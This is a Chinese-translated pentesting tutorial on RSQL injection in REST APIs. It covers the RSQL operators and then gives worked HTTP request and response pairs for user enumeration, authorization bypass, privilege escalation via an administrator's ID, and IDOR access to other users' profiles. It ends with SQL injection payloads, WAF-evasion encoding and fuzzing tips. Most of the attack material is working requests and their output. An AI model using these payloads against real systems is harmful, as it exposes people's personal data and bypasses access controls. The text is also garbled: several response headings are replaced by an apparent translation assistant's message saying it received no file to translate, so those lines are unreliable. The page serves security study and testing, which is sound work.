# RSQL Injection

{{#include ../banners/hacktricks-training.md}}

## RSQL 是什么？
RSQL 是一种查询语言，专为在 RESTful APIs 中对输入进行参数化过滤而设计。基于 FIQL (Feed Item Query Language)，最初由 Mark Nottingham 为查询 Atom feeds 指定，RSQL 以其简洁性和能够在 HTTP 上以紧凑且符合 URI 的方式表达复杂查询而著称。这使得它成为用于 REST endpoint 搜索的通用查询语言的优秀选择。

## 概述
RSQL Injection 是一种出现在在 RESTful APIs 中使用 RSQL 作为查询语言的 web 应用中的漏洞。类似于 [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) 和 [LDAP Injection](https://owasp.org/www-community/attacks/LDAP_Injection)，当 RSQL 过滤器未被正确消毒时，会发生此类漏洞，使攻击者能够注入恶意查询以未经授权地访问、修改或删除数据。

## 工作原理
RSQL 允许你在 RESTful APIs 中构建高级查询，例如：
```bash
/products?filter=price>100;category==electronics
```
这会被翻译为一个结构化查询，用于筛选价格大于 100 且类别为 “电子产品” 的产品。

如果应用程序未正确验证用户输入，攻击者可能会操纵该过滤器以执行意外的查询，例如：
```bash
/products?filter=id=in=(1,2,3);delete_all==true
```
甚至可以利用布尔查询或嵌套子查询来提取敏感信息。

## Risks
- **Exposure of sensitive data:** 攻击者可以检索本不应被访问的信息。
- **Data modification or deletion:** 注入会修改或删除数据库记录。
- **Privilege escalation:** 操作通过过滤器授予角色的标识符，欺骗应用以其他用户的权限访问。
- **Evasion of access controls:** 通过操纵过滤器访问受限数据。
- **Impersonation or IDOR:** 通过允许访问其他用户信息和资源的过滤器修改用户之间的标识符，而无需作为该用户正确认证。

## Supported RSQL operators
| Operator  | Description | Example  |
|:----: |:----: |:------------------:|
| `;` / `and` | 逻辑 **AND** 运算符。过滤同时满足两个条件的行 | `/api/v2/myTable?q=columnA==valueA;columnB==valueB` |
| `,` / `or` | 逻辑 **OR** 运算符。过滤至少满足一个条件的行 | `/api/v2/myTable?q=columnA==valueA,columnB==valueB` |
| `==` | 执行 **等于** 查询。返回 *myTable* 中 *columnA* 精确等于 *queryValue* 的所有行 | `/api/v2/myTable?q=columnA==queryValue` |
| `=q=` | 执行 **搜索** 查询。返回 *myTable* 中 *columnA* 包含 *queryValue* 的所有行 | `/api/v2/myTable?q=columnA=q=queryValue` |
| `=like=` | 执行 **like** 查询。返回 *myTable* 中 *columnA* 与 *queryValue* 相似的所有行 | `/api/v2/myTable?q=columnA=like=queryValue` |
| `=in=` | 执行 **in** 查询。返回 *myTable* 中 *columnA* 包含 *valueA* 或 *valueB* 的所有行 | `/api/v2/myTable?q=columnA=in=(valueA, valueB)` |
| `=out=` | 执行 **exclude** 查询。返回 *myTable* 中 *columnA* 的值既不是 *valueA* 也不是 *valueB* 的所有行 | `/api/v2/myTable?q=columnA=out=(valueA,valueB)` |
| `!=` | 执行 *not equals* 查询。返回 *myTable* 中 *columnA* 值不等于 *queryValue* 的所有行 | `/api/v2/myTable?q=columnA!=queryValue` |
| `=notlike=` | 执行 **not like** 查询。返回 *myTable* 中 *columnA* 与 *queryValue* 不相似的所有行 | `/api/v2/myTable?q=columnA=notlike=queryValue` |
| `<` & `=lt=` | 执行 **lesser than** 查询。返回 *myTable* 中 *columnA* 小于 *queryValue* 的所有行 | `/api/v2/myTable?q=columnA<queryValue` <br> `/api/v2/myTable?q=columnA=lt=queryValue` |
| `=le=` & `<=` | 执行 **lesser than** 或 **equal to** 查询。返回 *myTable* 中 *columnA* 小于或等于 *queryValue* 的所有行 | `/api/v2/myTable?q=columnA<=queryValue` <br> `/api/v2/myTable?q=columnA=le=queryValue` |
| `>` & `=gt=` | 执行 **greater than** 查询。返回 *myTable* 中 *columnA* 大于 *queryValue* 的所有行 | `/api/v2/myTable?q=columnA>queryValue` <br> `/api/v2/myTable?q=columnA=gt=queryValue` |
| `>=` & `=ge=` | 执行 **equal** to 或 **greater than** 查询。返回 *myTable* 中 *columnA* 大于或等于 *queryValue* 的所有行 | `/api/v2/myTable?q=columnA>=queryValue` <br> `/api/v2/myTable?q=columnA=ge=queryValue` |
| `=rng=` | 执行 **from to** 查询。返回 *myTable* 中 *columnA* 大于等于 *fromValue* 且小于等于 *toValue* 的所有行 | `/api/v2/myTable?q=columnA=rng=(fromValue,toValue)` |

**Note**: Table based on information from [**MOLGENIS**](https://molgenis.gitbooks.io/molgenis/content/) and [**rsql-parser**](https://github.com/jirutka/rsql-parser) applications.

#### Examples
- name=="Kill Bill";year=gt=2003
- name=="Kill Bill" and year>2003
- genres=in=(sci-fi,action);(director=='Christopher Nolan',actor==*Bale);year=ge=2000
- genres=in=(sci-fi,action) and (director=='Christopher Nolan' or actor==*Bale) and year>=2000
- director.lastName==Nolan;year=ge=2000;year=lt=2010
- director.lastName==Nolan and year>=2000 and year<2010
- genres=in=(sci-fi,action);genres=out=(romance,animated,horror),director==Que*Tarantino
- genres=in=(sci-fi,action) and genres=out=(romance,animated,horror) or director==Que*Tarantino

**Note**: Table based on information from [**rsql-parser**](https://github.com/jirutka/rsql-parser) application.

## Common filters
这些过滤器有助于在 API 中细化查询：

| Filter | Description | Example |
|--------|------------|---------|
| `filter[users]` | 按特定用户过滤结果 | `/api/v2/myTable?filter[users]=123` |
| `filter[status]` | 按状态过滤（active/inactive, completed 等） | `/api/v2/orders?filter[status]=active` |
| `filter[date]` | 在日期范围内过滤结果 | `/api/v2/logs?filter[date]=gte:2024-01-01` |
| `filter[category]` | 按类别或资源类型过滤 | `/api/v2/products?filter[category]=electronics` |
| `filter[id]` | 按唯一标识符过滤 | `/api/v2/posts?filter[id]=42` |


## Common parameters
这些参数有助于优化 API 响应：

| Parameter | Description | Example |
|-----------|------------|---------|
| `include` | 在响应中包含关联资源 | `/api/v2/orders?include=customer,items` |
| `sort` | 以升序或降序排序结果 | `/api/v2/users?sort=-created_at` |
| `page[size]` | 控制每页结果数量 | `/api/v2/products?page[size]=10` |
| `page[number]` | 指定页码 | `/api/v2/products?page[number]=2` |
| `fields[resource]` | 定义响应中要返回的字段 | `/api/v2/users?fields[users]=id,name,email` |
| `search` | 执行更灵活的搜索 | `/api/v2/posts?search=technology` |

## Information leakage and enumeration of users
下面的请求展示了一个注册端点，该端点需要 email 参数来检查是否有使用该电子邮件注册的用户，并根据该邮件是否存在于数据库中返回 true 或 false：
### Request
```
GET /api/registrations HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
我没有收到要翻译的文件内容。请粘贴 src/pentesting-web/rsql-injection.md 的内容或需要翻译的具体段落。我会按要求翻译（保留代码、标签、链接和路径不翻译，保持原有 Markdown/HTML 结构）。
```
HTTP/1.1 400
Date: Sat, 22 Mar 2025 14:47:14 GMT
Content-Type: application/vnd.api+json
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *
Content-Length: 85

{
"errors": [{
"code": "BLANK",
"detail": "Missing required param: email",
"status": "400"
}]
}
```
尽管预期请求为 `/api/registrations?email=<emailAccount>`，但可以使用 RSQL 过滤器通过特殊运算符尝试 enumerate 和/或 extract 用户信息：
### Request
```
GET /api/registrations?filter[userAccounts]=email=='test@test.com' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Origin: https://locahost:3000
Connection: keep-alive
Referer: https://locahost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
我还没收到要翻译的文件内容。请把 src/pentesting-web/rsql-injection.md 的原文粘贴到对话中（保留原有的 Markdown/HTML 标签、链接和路径）。收到后我会按照你的规则把英文翻译成中文。
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 14:09:38 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 38
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": {
"attributes": {
"tenants": []
}
}
}
```
如果匹配到有效的电子邮件账户，应用程序会在对服务器的响应中返回用户的信息，而不是经典的 *“true”*、*"1"* 或其他类似值：
### Request
```
GET /api/registrations?filter[userAccounts]=email=='manuel**********@domain.local' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
我没有收到要翻译的文件内容。请把 src/pentesting-web/rsql-injection.md 的 Markdown 内容粘贴到此处，我会按你给的规则把其中的英文翻译成中文并保持原有的 Markdown/HTML 语法、标签与链接不变。
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 14:19:46 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 293
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": {
"id": "********************",
"type": "UserAccountDTO",
"attributes": {
"id": "********************",
"type": "UserAccountDTO",
"email": "manuel**********@domain.local",
"sub": "*********************",
"status": "ACTIVE",
"tenants": [{
"id": "1"
}]
}
}
}
```
## Authorization evasion
在这个场景中，我们从一个具有基本角色的用户开始，并且没有特权权限（例如 administrator）来访问数据库中注册的所有用户列表：
### 请求
```
GET /api/users HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJhb.................
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
我没有收到要翻译的文件内容。请粘贴 src/pentesting-web/rsql-injection.md 的文本（或确认我可以访问该内容），我会按要求将相关英文翻译成中文，并保留所有代码、标签、链接和路径不翻译。
```
HTTP/1.1 403
Date: Sat, 22 Mar 2025 14:40:07 GMT
Content-Length: 0
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *
```
我们再次利用过滤器和特殊操作符，这将为我们提供另一种获取用户信息并绕过访问控制的方法。
例如，过滤那些 *用户* 的 *ID* 中包含字母 “*a*”：
### Request
```
GET /api/users?filter[users]=id=in=(*a*) HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJhb.................
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
我需要该文件的内容才能翻译。请粘贴 src/pentesting-web/rsql-injection.md 的文本，或指定要翻译的部分。
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 14:43:28 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 1434192
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"id": "********A***********",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 3,
"translationKey": "************",
"email": "**********@domain.local",
"firstName": "rafael",
"surname": "************",
"telephoneCountryCode": "**",
"mobilePhone": "*********",
"taxIdentifier": "********",
"languageId": 1,
"createdAt": "2024-08-09T10:57:41.237Z",
"termsOfUseAccepted": true,
"id": "******************",
"type": "UserGetResponseCustomDTO"
}
}, {
"id": "*A*******A*****A*******A******",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 3,
"translationKey": ""************",
"email": "juan*******@domain.local",
"firstName": "juan",
"surname": ""************",",
"telephoneCountryCode": "**",
"mobilePhone": "************",
"taxIdentifier": "************",
"languageId": 1,
"createdAt": "2024-07-18T06:07:37.68Z",
"termsOfUseAccepted": true,
"id": "*******************",
"type": "UserGetResponseCustomDTO"
}
}, {
................
```
## Privilege Escalation
很可能会发现某些 endpoints 会通过它们的 role 来检查 user 的 privileges。例如，我们正处理的 user 没有任何 privileges：
### 请求
```
GET /api/companyUsers?include=role HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJhb......
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
请提供 src/pentesting-web/rsql-injection.md 的内容（或要翻译的文本）。我会把其中的英文翻译成中文，并严格保留所有 markdown/HTML 标签、代码、链接、引用和路径不变。
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:13:08 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 11
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": []
}
```
使用某些运算符，我们可以枚举管理员用户：
### Request
```
GET /api/companyUsers?include=role&filter[companyUsers]=user.id=='94****************************' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJh.....
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
我没有收到要翻译的文件内容。请粘贴 src/pentesting-web/rsql-injection.md 的 Markdown 内容，我会把其中的英文翻译成中文，并保持原有的 Markdown/HTML 语法、标签和路径不变。
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:13:45 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 361
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"type": "CompanyUserGetResponseDTO",
"attributes": {
"companyId": "FA**************",
"companyTaxIdentifier": "B999*******",
"bizName": "company sl",
"email": "jose*******@domain.local",
"userRole": {
"userRoleId": 1,
"userRoleKey": "general.roles.admin"
},
"companyCountryTranslationKey": "*******",
"type": "CompanyUserGetResponseDTO"
}
}]
}
```
在知道某个 administrator 用户的标识符后，可以通过将相应的过滤器替换为或添加该 administrator 的标识符来利用 privilege escalation，从而获得相同的权限：
### Request
```
GET /api/functionalities/allPermissionsFunctionalities?filter[companyUsers]=user.id=='94****************************' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJ.....
Origin: https:/localhost:3000
Connection: keep-alive
Referer: https:/localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### 响应
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 18:53:00 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 68833
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"meta": {
"Functionalities": [{
"functionalityId": 1,
"permissionId": 1,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "general.userProfile",
"type": "FunctionalityPermissionDTO"
}, {
"functionalityId": 2,
"permissionId": 2,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "general.my_profile",
"type": "FunctionalityPermissionDTO"
}, {
"functionalityId": 3,
"permissionId": 3,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "layout.change_user_data",
"type": "FunctionalityPermissionDTO"
}, {
"functionalityId": 4,
"permissionId": 4,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "general.configuration",
"type": "FunctionalityPermissionDTO"
}, {
....
}]
}
}
```
## Impersonate or Insecure Direct Object References (IDOR)
除了使用 `filter` 参数之外，还可以使用其他参数，例如 `include`，它允许在结果中包含某些字段（例如语言、国家、密码等）。

在下面的示例中，展示了我们用户资料的信息：
### 请求
```
GET /api/users?include=language,country HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJ...
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
我没有收到要翻译的文件内容。请粘贴 src/pentesting-web/rsql-injection.md 的原文内容（或指定要翻译的片段），我会按要求将相关英文翻译为中文并保留原有的 Markdown/HTML 语法。
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:47:27 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 540
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"id": "D5********************",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 3,
"translationKey": "**********",
"email": "domingo....@domain.local",
"firstName": "Domingo",
"surname": "**********",
"telephoneCountryCode": "**",
"mobilePhone": "******",
"languageId": 1,
"createdAt": "2024-03-11T07:24:57.627Z",
"termsOfUseAccepted": true,
"howMeetUs": "**************",
"id": "D5********************",
"type": "UserGetResponseCustomDTO"
}
}]
}
```
可以通过组合使用过滤器来规避授权控制并访问其他用户的个人资料：
### Request
```
GET /api/users?include=language,country&filter[users]=id=='94***************' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJ...
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
我没有收到要翻译的文件内容。请粘贴 src/pentesting-web/rsql-injection.md 的完整 Markdown 内容，或说明要翻译的具体段落。
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:50:07 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 520
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"id": "94******************",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 2,
"translationKey": "**************",
"email": "jose******@domain.local",
"firstName": "jose",
"surname": "***************",
"telephoneCountryCode": "**",
"mobilePhone": "********",
"taxIdentifier": "*********",
"languageId": 1,
"createdAt": "2024-11-21T08:29:05.833Z",
"termsOfUseAccepted": true,
"id": "94******************",
"type": "UserGetResponseCustomDTO"
}
}]
}
```
## 检测与模糊测试 快速技巧
- 通过发送无害探针检查是否支持 RSQL，例如 `?filter=id==test`、`?q==test` 或格式错误的运算符 `=foo=`；冗长的 APIs 通常会 leak 解析器错误（"Unknown operator" / "Unknown property"）。
- 许多实现会对 URL 参数进行双重解析；尝试对 `(`、`)`、`*`、`;` 进行双重编码（例如 `%2528admin%2529`）以绕过简单的 blocklists 和 WAFs。
- Boolean exfil with wildcards: 示例 `filter[users]=email==*%@example.com;status==ACTIVE`，并用 `,`（OR）翻转逻辑，通过比较响应大小判断。
- Range/proximity leaks: `filter[users]=createdAt=rng=(2024-01-01,2025-01-01)` 可以在不知道确切 ID 的情况下按年快速枚举。

## Framework-specific abuse (Elide / JPA Specification / JSON:API)
- Elide 和许多 Spring Data REST 项目将 RSQL 直接翻译为 JPA Criteria。当开发者添加自定义运算符（例如 `=ilike=`）并通过字符串拼接而不是使用预编译参数来构建谓词时，可能被利用为 SQLi（经典载荷：`name=ilike='%%' OR 1=1--'`）。
- Elide analytic data store 接受参数化列；将用户可控的分析参数与 RSQL 过滤器结合是导致 CVE-2022-24827 中 SQLi 的根本原因。即使补丁版本正确地使用参数化，类似的定制代码通常仍然存在——搜索包含 `${}` 的 `@JoinFilter`/`@ReadPermission` SpEL 表达式，尝试注入 `';sleep(5);'` 或逻辑恒真式。
- JSON:API 后端通常同时暴露 `include` 和 `filter`。对关联资源进行过滤（例如 `filter[orders]=customer.email==*admin*`）可能绕过顶层 ACL，因为关联级别的过滤在所有权检查之前执行。

## 自动化辅助
- **rsql-parser CLI (Java)**: `java -jar rsql-parser.jar "name=='*admin*';status==ACTIVE"` 在本地验证 payloads 并显示抽象语法树——有助于构造平衡的括号和自定义运算符。
- **Python quick builder**:
```python
from pyrsql import RSQL
payload = RSQL().and_("email==*admin*", "status==ACTIVE").or_("role=in=(owner,admin)")
print(str(payload))
```
- 将其与 HTTP fuzzer (ffuf, turbo-intruder) 配合使用，通过在 `=in=` 列表中迭代通配符位置 `*a*`, `*e*` 等，快速枚举 ID 和电子邮件。

## 参考资料
- [RSQL Injection](https://owasp.org/www-community/attacks/RSQL_Injection)
- [RSQL Injection Exploitation](https://m3n0sd0n4ld.github.io/patoHackventuras/rsql_injection_exploitation)
- [Elide filtering & security considerations](https://elide.io/pages/guide/03-analytics.html)

{{#include ../banners/hacktricks-training.md}}
